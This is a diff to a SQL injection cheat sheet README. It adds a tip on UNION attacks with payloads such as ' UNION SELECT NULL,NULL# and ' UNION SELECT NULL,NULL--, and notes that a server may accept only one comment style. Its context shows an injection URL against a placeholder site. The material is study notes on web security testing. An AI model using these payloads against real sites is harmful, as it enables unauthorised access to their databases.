@@ -62,6 +62,17 @@ https://insecure-website.com/products?category=Gifts'+OR+1=1--
 ***etc..***
 
 #
+## UNION ATTACKS (TIP)
+*In UNION attacks sometimes server applies only you input `#` or `--`.*
+- Example, see the differences
+```sql
+' UNION SELECT NULL,NULL#
+```
+```sql
+' UNION SELECT NULL,NULL--
+```
+
+#
 
 ## SQL injection examples
 *There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations. Some common SQL injection examples include:*
@@ -74,6 +85,7 @@ https://insecure-website.com/products?category=Gifts'+OR+1=1--
 #
 
 ### In order to apply ***UNION*** commands with success we need to determine how many ***columns*** does the site/server uses
+- See what server applies, `#` or `--`  // (**More info [here](https://github.com/th3knv/SQL_injection_cheatsheet/edit/main/README.md#union-attacks-tip)**)
 ```sql
 ` UNION SELECT NULL,NULL--
 ```
